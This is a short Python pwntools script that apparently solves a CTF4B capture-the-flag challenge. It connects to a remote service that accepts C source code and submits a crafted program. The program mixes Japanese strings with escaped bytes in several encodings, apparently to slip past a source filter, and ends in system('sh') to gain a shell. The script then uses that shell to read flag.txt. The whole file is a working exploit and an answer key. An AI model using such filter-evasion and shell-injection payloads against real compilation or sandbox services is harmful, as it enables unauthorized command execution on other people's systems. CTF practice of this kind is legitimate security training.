#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '5000'))

context.log_level = 'critical'
io = remote(HOST, PORT)

payload = 'int main(){puts("'
payload += '廃墟の街'
payload += 'イチジクのタルト'
payload += '天使'
payload += '紫陽花'
payload += '\\x83\\x4a\\x83\\x75\\x83\\x67\\x92\\x8e'
payload += '\\x83\\x43\\x83\\x60\\x83\\x57\\x83\\x4e\\x82\\xcc\\x83\\x5e\\x83\\x8b\\x83\\x67'
payload += '\\x94\\xe9\\x96\\xa7\\x82\\xcc\\x8d\\x63\\x92\\xe9'
payload += '\\x30\\x89\\x30\\x5b\\x30\\x93\\x96\\x8e\\x6b\\xb5'
payload += '\\x2b\\x4d\\x4b\\x51\\x2d\\x2b\\x4d\\x4d\\x45\\x2d\\x2b\\x4d\\x4c\\x67\\x2d\\x2b\\x4d\\x4b\\x38\\x2d\\x2b\\x4d\\x47\\x34\\x2d\\x2b\\x4d\\x4c\\x38\\x2d\\x2b\\x4d'
payload += '\\x72\\x79\\x75\\x70\\x70\\xb9'
payload += '\\x2b\\x63\\x6e\\x6b\\x2d\\x2b\\x64\\x58\\x41\\x2d\\x2b\\x63'
payload += '\\x2b\\x4d\\x4c\\x67\\x2d\\x2b\\x4d\\x4f\\x63\\x2d\\x2b\\x4d\\x4d\\x4d\\x2d\\x2b'
payload += '");system("sh");}'

io.sendlineafter(b'source:\n', payload.encode())

io.sendline(b'echo exploited')
io.sendlineafter(b'exploited', b'cat flag.txt')
io.readline()
print(io.readline().decode(), end='')
